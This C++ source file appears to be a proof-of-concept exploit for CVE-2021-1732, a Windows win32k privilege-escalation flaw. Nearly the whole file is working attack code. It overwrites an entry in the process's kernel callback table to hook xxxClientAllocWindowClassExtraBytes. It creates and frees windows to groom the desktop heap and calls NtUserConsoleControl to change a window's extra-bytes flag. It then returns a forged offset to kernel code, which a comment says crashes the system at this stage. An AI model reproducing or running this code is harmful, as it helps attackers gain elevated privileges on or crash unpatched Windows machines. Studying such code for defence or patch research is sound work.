#include "include/core/poc.hpp"
using namespace CVE_2021_1732;
namespace offset = exploit::gadget::X_17763_737;
namespace CVE_2021_1732
{
    LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
    {
        return ::DefWindowProcW(hWnd, msg, wParam, lParam);
    }

    NTSTATUS MyxxxClientAllocWindowClassExtraBytes(unsigned int* pSize) {
        printf("[+] Called MyxxxClientAllocWindowClassExtraBytes, want extra: 0x%p=0x%x\n", pSize, *pSize);
        int i = 0;
        if (*pSize == magicExtra) {
            HWND hwndMagic = NULL;
            //search from freed NormalClass window mapping desktop heap
            for (i = 2; i < g_HWNDKs.size(); ++i) {
                ULONG_PTR cbWndExtra = *reinterpret_cast<ULONG_PTR*>(
                    (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::cbWndExtra));
                printf("[xxxClient] check: %x\n", cbWndExtra);
                if (magicExtra == cbWndExtra) {
                    hwndMagic = (HWND) * (ULONG_PTR*)(g_HWNDKs[i]);
                    break;
                }
            }
            if (!hwndMagic) {
                printf("[-] Not found hwndMagic, memory layout unsuccessfully :( \n");
                goto end;
            }
            printf("[+] Found hwndMagic: g_HWNDKs[%d], 0x%llX: 0x%X\n", i, g_HWNDKs[i], hwndMagic);
            printf("[+] Magic Window's extraFlag=0x%X\n", *reinterpret_cast<DWORD*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::dwExtraFlag)));

            ULONG_PTR ConsoleCtrlInfo[2] = { 0 };
            ULONG_PTR hookResult[3] = { 0 };

            // // 1. set hwndMagic extraFlag |= 0x800
            ULONG_PTR ChangeOffset = 0;
            ConsoleCtrlInfo[0] = (ULONG_PTR)hwndMagic; // 第一个参数需要为窗口句柄
            ConsoleCtrlInfo[1] = (ULONG_PTR)ChangeOffset;
            // NTSTATUS ret = NtUserConsoleControl(6, (ULONG_PTR)&ConsoleCtrlInfo, sizeof(ConsoleCtrlInfo));
            NTSTATUS ret = NtUserConsoleControl(6, reinterpret_cast<ULONG_PTR>(&ConsoleCtrlInfo), sizeof(ConsoleCtrlInfo));
            if (!NT_SUCCESS(ret)) {
                printf("[x] Call NtUserConsoleControl failed\n");
            }
            printf("[+] Magic Window's extraFlag=0x%X\n", *reinterpret_cast<DWORD*>(
                (reinterpret_cast<ULONG_PTR>(g_HWNDKs[i]) + offset::tagWND::tagWNDK::dwExtraFlag)));

            // 2. set hwndMagic pExtraBytes fake offset
            struct {
                ULONG_PTR retvalue;
                ULONG_PTR unused1;
                ULONG_PTR unused2;
            } result = { 0 };
            // offset = 0xffffff00, access memory = heap base + 0xffffff00, trigger BSOD	
            result.retvalue = 0xffffff00;
            // result.retvalue = 0;
            return NtCallbackReturn(reinterpret_cast<DWORD64*>(&result), sizeof(result), 0);
        }
    end:
        return orign_xxxClientAllocWindowClassExtraBytes(pSize);
    }

    bool PoC() {

        if (!initAPI())
            return false;

        // 进行hook user!xxxClientAllocWindowClassExtraBytes
        auto pPEB = __readgsqword(0x60);
        auto pKernelCallbackTable = *(PULONG_PTR*)(pPEB + 0x58);
        orign_xxxClientAllocWindowClassExtraBytes = (FxxxClientAllocWindowClassExtraBytes)pKernelCallbackTable[123];
        printf("[+] Kernel Callback Table at: 0x%p\n[+] user!xxxClientAllocWindowClassExtraBytes at 0x%p\n[+] New MyxxxClientAllocWindowClassExtraBytes: 0x%p\n", pKernelCallbackTable, orign_xxxClientAllocWindowClassExtraBytes, MyxxxClientAllocWindowClassExtraBytes);
        DWORD oldProtect;
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
        pKernelCallbackTable[123] = reinterpret_cast<ULONG_PTR>(MyxxxClientAllocWindowClassExtraBytes);
        VirtualProtect((LPVOID)pKernelCallbackTable, 0x1000, oldProtect, &oldProtect);


        // 注册两种类别的窗口类
        WNDCLASSEXW wc = { sizeof(wc), CS_CLASSDC, WndProc, 0L, 0L, GetModuleHandle(nullptr), nullptr, nullptr, nullptr, nullptr, L"TypeA", nullptr };
        wc.cbSize = sizeof(WNDCLASSEX);
        wc.cbWndExtra = sizeof(LONG_PTR);

        auto atom1 = ::RegisterClassExW(&wc);
        wc.lpszClassName = L"TypeB";
        wc.cbWndExtra = magicExtra;
        auto atom2 = ::RegisterClassExW(&wc);

        for (size_t i = 0; i < 0x20; i++)
        {
            HWND temp = CreateWindowExW(0, L"TypeA", L"wndexp",
                CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
                CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
            g_HWNDs.push_back(temp);
            PVOID tempPVoid = HMValidateHandle(temp, 1);
            g_HWNDKs.push_back(tempPVoid);
            // printf("[+] created %x at tagWNDK: %p\n", temp, tempPVoid);
        }
        for (size_t i = 2; i < 0x20; i++) {
            DestroyWindow(g_HWNDs[i]);
        }

        HWND choseenOne = CreateWindowExW(0, L"TypeB", L"wndexp",
            CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
            CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
        printf("[+] HWND value: 0x%x\n", choseenOne);


        // HWND hwnd;
        // MSG msg;

        // hwnd = CreateWindowExW(0, L"TypeA", L"wndexp",
        //     WS_OVERLAPPEDWINDOW & ~WS_THICKFRAME & ~WS_MAXIMIZEBOX, CW_USEDEFAULT, CW_USEDEFAULT,
        //     CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL); // 创建windows窗口

        // int a = 0xDEADBEEF;
        // SetWindowLong(hwnd, 0, a);
        // LONG_PTR retrievedValue = GetWindowLong(hwnd, 0);
        // printf("HWND value: 0x%x\nwrite in: 0x%x\nread with: 0x%x\n", hwnd, a, retrievedValue);
        // printf("[+] Window tagWND at: 0x%p\n", HMValidateHandle(hwnd, 1));
        // getchar();
        // retrievedValue = GetWindowLong(hwnd, 0);
        // printf("[+] Read again with: 0x%x\n", retrievedValue);
        // getchar();

        return true;
    }


} // namespace CVE_2021_1732